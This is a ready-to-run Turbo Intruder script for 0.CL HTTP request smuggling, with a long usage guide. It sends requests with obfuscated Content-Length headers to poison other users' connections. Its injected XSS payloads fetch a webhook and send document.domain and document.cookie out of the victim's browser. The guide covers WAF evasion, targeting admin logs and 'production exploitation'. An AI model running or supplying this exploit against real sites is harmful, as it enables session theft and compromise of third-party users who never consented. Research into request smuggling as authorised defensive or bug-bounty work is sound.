# Universal 0.CL Request Smuggling Script for Turbo Intruder
# Based on research by James Kettle: https://portswigger.net/research/http1-must-die
# Implements BOTH HEAD redirect and User-Agent XSS techniques

# ============================================================================
# CONFIGURATION - Customize these for your target
# ============================================================================

CONFIG = {
    # Target configuration
    'target_host': 'vulnerable-website.com',
    'target_port': 443,
    'use_https': True,
    
    # Webhook for XSS callback (use Burp Collaborator, webhook.site, interact.sh, etc.)
    'webhook_url': 'https://YOUR-WEBHOOK-ID.oastify.com',  # CHANGE THIS!
    
    # Attack method selection
    'attack_method': 'both',  # Options: 'head', 'user-agent', 'both'
    
    # Attack vectors - customize for your target
    'gadget_path': '/resources/css/anything',  # Path that triggers early response
    'gadget_method': 'POST',
    
    # HEAD technique configuration (James Kettle's preferred method)
    'head_static_resources': [
        '/static/app.js',
        '/static/main.css',
        '/resources/script.js',
        '/assets/style.css',
        '/js/main.js',
        '/css/app.css',
    ],
    
    # User-Agent technique configuration (fallback method)
    'smuggled_method': 'GET',
    'smuggled_path': '/',  # Target path for User-Agent smuggling
    
    # Detection configuration
    'detection_path': '/404',  # Path for detection request
    
    # Engine configuration
    'concurrent_connections': 10,
    'requests_per_connection': 1,
    'timeout': 15,
    'max_retries': 0,
    'attack_iterations': 100,  # Number of attack attempts (set to -1 for infinite)
    
    # Advanced options
    'content_length_obfuscation': 'space',  # Options: space, tab, newline, multiple
    'stage2_method': 'OPTIONS',  # Method for chopped request (OPTIONS, GET, POST)
    'add_cache_buster': True,  # Add random param to avoid caching
}

# ============================================================================
# MAIN ATTACK LOGIC
# ============================================================================

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=CONFIG['concurrent_connections'],
        requestsPerConnection=CONFIG['requests_per_connection'],
        engine=Engine.BURP,
        maxRetriesPerRequest=CONFIG['max_retries'],
        timeout=CONFIG['timeout']
    )
    
    # Validate webhook is configured
    if 'YOUR-WEBHOOK' in CONFIG['webhook_url']:
        raise Exception('Please configure your webhook URL in CONFIG!')
    
    # Build target host string
    host = CONFIG['target_host']
    
    # Build Content-Length header with obfuscation
    cl_header = build_cl_header(CONFIG['content_length_obfuscation'])
    
    # Stage 1: Early response gadget with obfuscated CL header
    stage1 = build_stage1(host, cl_header)
    
    # Stage 2 chopped: Request that gets split
    stage2_chopped = build_stage2_chopped()
    
    # Stage 2 revealed: Completes the chopped request
    stage2_revealed = build_stage2_revealed(host)
    
    # Victim request: Normal request that will be poisoned
    victim = build_victim_request(host)
    
    # Validation
    if '%s' not in stage1:
        raise Exception('Stage1 must contain %s for CL value substitution')
    
    if not stage1.endswith('\r\n\r\n'):
        raise Exception('Stage1 must end with blank line (\\r\\n\\r\\n) and have no body')
    
    print(f'[*] Starting 0.CL Request Smuggling attack')
    print(f'[*] Target: {host}')
    print(f'[*] Webhook: {CONFIG["webhook_url"]}')
    print(f'[*] Attack Method: {CONFIG["attack_method"].upper()}')
    print(f'[*] Watch your webhook for callbacks!')
    print(f'[*]')
    
    if CONFIG['attack_method'] in ['head', 'both']:
        print(f'[*] HEAD technique: Testing {len(CONFIG["head_static_resources"])} static resources')
    if CONFIG['attack_method'] in ['user-agent', 'both']:
        print(f'[*] User-Agent technique: Target path {CONFIG["smuggled_path"]}')
    
    print(f'[*]')
    
    # Attack loop
    iteration = 0
    resource_index = 0
    
    while CONFIG['attack_iterations'] == -1 or iteration < CONFIG['attack_iterations']:
        
        # Determine which technique to use this iteration
        if CONFIG['attack_method'] == 'both':
            # Alternate between HEAD and User-Agent techniques
            use_head = (iteration % 2 == 0)
        elif CONFIG['attack_method'] == 'head':
            use_head = True
        else:  # user-agent
            use_head = False
        
        # Build smuggled request based on technique
        if use_head:
            # Cycle through different static resources
            static_resource = CONFIG['head_static_resources'][resource_index % len(CONFIG['head_static_resources'])]
            smuggled = build_smuggled_head_request(host, static_resource)
            technique_label = 'HEAD'
            resource_index += 1
        else:
            smuggled = build_smuggled_useragent_request(host)
            technique_label = 'User-Agent'
        
        # Calculate the length for stage2_chopped
        chopped_length = len(stage2_chopped)
        
        # Queue the attack sequence
        engine.queue(stage1, chopped_length, label='stage1', fixContentLength=False)
        engine.queue(stage2_chopped + stage2_revealed + smuggled, label=f'stage2-{technique_label}')
        engine.queue(victim, label=f'victim-{technique_label}')
        
        iteration += 1
        
        # Progress update every 20 requests
        if iteration % 20 == 0:
            print(f'[*] Completed {iteration} attack attempts...')
            engine.queue(build_sleep_request(host), label='sleep')


def build_xss_payload():
    """Build XSS payload that calls back to webhook"""
    webhook = CONFIG['webhook_url']
    
    # Payload for User-Agent technique
    return f'"/><script>fetch("{webhook}?xss="+document.domain)</script><x x="'


def build_head_xss_payload():
    """Build XSS payload for HEAD technique (used in query parameter)"""
    webhook = CONFIG['webhook_url']
    
    # These payloads work in Location headers after redirect
    payloads = [
        f'</script><script>fetch("{webhook}?head="+document.domain)</script>',
        f'?"><script>fetch("{webhook}?head="+document.cookie)</script><x x="',
        f'"></script><script>new Image().src="{webhook}?head=success"</script><x x="',
    ]
    
    return payloads[0]


def build_cl_header(obfuscation_type):
    """Build Content-Length header with various obfuscation techniques"""
    if obfuscation_type == 'space':
        return 'Content-Length : %s'
    elif obfuscation_type == 'tab':
        return 'Content-Length\t: %s'
    elif obfuscation_type == 'newline':
        return 'Content-Length\r\n : %s'
    elif obfuscation_type == 'multiple':
        return 'Content-Length: 0\r\nContent-Length : %s'
    else:
        return 'Content-Length : %s'


def build_stage1(host, cl_header):
    """Build the stage 1 request with early response gadget"""
    cache_buster = ''
    if CONFIG['add_cache_buster']:
        import random
        cache_buster = f'?cb={random.randint(1000, 9999)}'
    
    request = f'''{CONFIG['gadget_method']} {CONFIG['gadget_path']}{cache_buster} HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
{cl_header}

'''
    return request


def build_smuggled_head_request(host, static_resource):
    """Build smuggled HEAD request (James Kettle's technique)"""
    xss_payload = build_head_xss_payload()
    
    # HEAD request to static resource with XSS in query parameter
    # This causes a redirect with Location header containing the XSS
    request = f'''HEAD {static_resource}?x={xss_payload} HTTP/1.1
Host: {host}
Content-Length: 5

x=1'''
    
    return request


def build_smuggled_useragent_request(host):
    """Build smuggled GET request with XSS in User-Agent (fallback technique)"""
    xss_payload = build_xss_payload()
    
    request = f'''{CONFIG['smuggled_method']} {CONFIG['smuggled_path']} HTTP/1.1
Host: {host}
User-Agent: {xss_payload}
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1'''
    
    return request


def build_stage2_chopped():
    """Build the chopped portion of stage 2"""
    request = f'''{CONFIG['stage2_method']} / HTTP/1.1
Content-Length: 123
X: Y'''
    
    return request


def build_stage2_revealed(host):
    """Build the revealed portion that completes stage 2"""
    cache_buster = ''
    if CONFIG['add_cache_buster']:
        import random
        cache_buster = f'?cb={random.randint(1000, 9999)}'
    
    request = f'''GET {CONFIG['detection_path']}{cache_buster} HTTP/1.1
Host: {host}
User-Agent: smuggle-detector
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

'''
    
    return request


def build_victim_request(host):
    """Build the victim request that will be poisoned"""
    request = f'''GET / HTTP/1.1
Host: {host}
User-Agent: victim-browser
Connection: keep-alive

'''
    
    return request


def build_sleep_request(host):
    """Build a simple request to act as a delay"""
    request = f'''GET / HTTP/1.1
Host: {host}

'''
    
    return request


def handleResponse(req, interesting):
    """Handle responses and detect successful smuggling"""
    table.add(req)
    
    # Determine which technique was used
    is_head_technique = 'HEAD' in req.label
    is_useragent_technique = 'User-Agent' in req.label
    
    # Focus on victim responses
    if 'victim' in req.label:
        response_text = req.response.lower() if req.response else ''
        
        # Common XSS indicators
        xss_indicators = [
            '<script>',
            'fetch(',
            'document.domain',
            'document.cookie',
            CONFIG['webhook_url'].lower(),
        ]
        
        # HEAD technique specific indicators
        head_indicators = [
            'location:',  # Redirect with Location header
            '301 moved',
            '302 found',
            '307 temporary',
            '308 permanent',
        ]
        
        # Check for XSS indicators
        for indicator in xss_indicators:
            if indicator in response_text:
                technique = 'HEAD' if is_head_technique else 'User-Agent'
                print(f'')
                print(f'[+] POTENTIAL XSS DETECTED! ({technique} technique)')
                print(f'[+] Indicator: "{indicator}"')
                print(f'[+] Status: {req.status}')
                print(f'[+] Length: {len(req.response)}')
                print(f'[!] CHECK YOUR WEBHOOK FOR CALLBACK!')
                print(f'')
                
                req.interesting = True
                break
        
        # HEAD technique: Look for redirects with our payload
        if is_head_technique:
            for indicator in head_indicators:
                if indicator in response_text:
                    print(f'[+] HEAD REDIRECT DETECTED!')
                    print(f'[+] Status: {req.status}')
                    print(f'[!] Possible Location header with XSS payload')
                    req.interesting = True
                    break
        
        # Check for reflected webhook URL
        if CONFIG['webhook_url'] in req.response:
            technique = 'HEAD' if is_head_technique else 'User-Agent'
            print(f'')
            print(f'[+] SUCCESS! Webhook URL reflected! ({technique} technique)')
            print(f'[+] Status: {req.status}')
            print(f'[!] Monitor {CONFIG["webhook_url"]} for XSS callback')
            print(f'')
            req.interesting = True
        
        # Check for unusual status codes
        if req.status in [403, 401, 500, 502, 503]:
            technique = 'HEAD' if is_head_technique else 'User-Agent'
            print(f'[*] Interesting status {req.status} on victim request ({technique})')
    
    # Log stage errors for debugging
    elif req.label.startswith('stage'):
        if req.status >= 400 and req.status != 404:
            print(f'[!] Error in {req.label}: Status {req.status}')


# ============================================================================
# USAGE INSTRUCTIONS
# ============================================================================
"""
QUICK START GUIDE:
==================

1. GET A WEBHOOK:
   - Burp Collaborator (Burp Suite Pro): Right-click -> "Copy to clipboard"
   - Free alternatives: webhook.site, interact.sh, pipedream.com
   
2. CONFIGURE:
   - Set 'target_host' to your target domain
   - Set 'webhook_url' to your webhook URL
   - Set 'gadget_path' to a path that returns early (try /static/*, /css/*, /js/*)
   - Set 'attack_method' to: 'both', 'head', or 'user-agent'
   
3. RUN:
   - Load this script in Turbo Intruder
   - Click "Attack"
   - Watch the console output AND your webhook!

ATTACK METHODS EXPLAINED:
==========================

HEAD TECHNIQUE (Recommended - James Kettle's method):
- Smuggles HEAD requests to static resources
- XSS payload in query parameter: /static/app.js?x=<script>...
- Server redirects, putting XSS in Location header
- More reliable, works on static files
- Less likely to be blocked by WAF

Example:
HEAD /static/app.js?x=</script><script>fetch('webhook')</script> HTTP/1.1

USER-AGENT TECHNIQUE (Fallback):
- Smuggles GET requests with XSS in User-Agent header
- Requires page that reflects/logs User-Agent
- Default targets homepage (/) which often logs requests
- Can target specific paths like /admin for admin logs
- May be caught by WAF/encoding

Example:
GET / HTTP/1.1
User-Agent: "/><script>fetch('webhook')</script>

BOTH (Default):
- Alternates between HEAD and User-Agent techniques
- Maximizes chance of success
- Tests multiple vectors automatically

CONFIGURATION OPTIONS:
======================

'attack_method': 
  - 'both'       -> Try both techniques (recommended)
  - 'head'       -> Only HEAD technique
  - 'user-agent' -> Only User-Agent technique

'head_static_resources':
  - List of static file paths to test with HEAD
  - Script cycles through these automatically
  - Add your target's specific static paths

'smuggled_path':
  - Only used for User-Agent technique
  - Target endpoint (default: / for homepage)
  - Can target specific paths like /admin, /profile, /search

SUCCESS INDICATORS:
===================

HEAD TECHNIQUE:
✓ Webhook receives callback with domain/cookie
✓ Console shows "HEAD REDIRECT DETECTED"
✓ 301/302/307/308 status codes in victim response
✓ Location header visible in response

USER-AGENT TECHNIQUE:
✓ Webhook receives callback
✓ Console shows "POTENTIAL XSS DETECTED"
✓ User-Agent reflected in response body
✓ Admin logs show request with payload

TROUBLESHOOTING:
================

No callbacks with HEAD:
- Try different static resources in 'head_static_resources'
- Verify files actually exist (check in browser)
- Some servers may not redirect on HEAD requests
- Switch to 'user-agent' method

No callbacks with User-Agent:
- Target may not reflect/log User-Agent
- Try different 'smuggled_path' values
- Check if headers are sanitized
- Switch to 'head' method

General issues:
- Verify webhook URL is correct and accessible
- Try different 'content_length_obfuscation' types
- Reduce 'concurrent_connections' if rate limited
- Increase 'timeout' if getting timeouts

WHICH METHOD TO USE:
====================

Use HEAD when:
✓ Target has accessible static resources
✓ You want more reliable exploitation
✓ Bug bounty hunting (cleaner PoC)
✓ WAF is blocking User-Agent payloads

Use User-Agent when:
✓ HEAD requests are blocked/filtered
✓ Target logs headers extensively
✓ Admin panel with request monitoring
✓ Static resources not accessible

Use BOTH when:
✓ You're not sure which will work
✓ Testing phase of bug bounty
✓ Want maximum coverage
✓ Time is not a concern

EXAMPLE CONFIGURATIONS:
=======================

# Maximum coverage (recommended for initial testing)
'attack_method': 'both'
'attack_iterations': 100

# HEAD only (for production exploitation)
'attack_method': 'head'
'head_static_resources': ['/static/app.js', '/js/main.js']
'attack_iterations': 50

# User-Agent only (for logged endpoints)
'attack_method': 'user-agent'
'smuggled_path': '/'  # or '/admin/logs' for specific targets
'attack_iterations': 50
"""
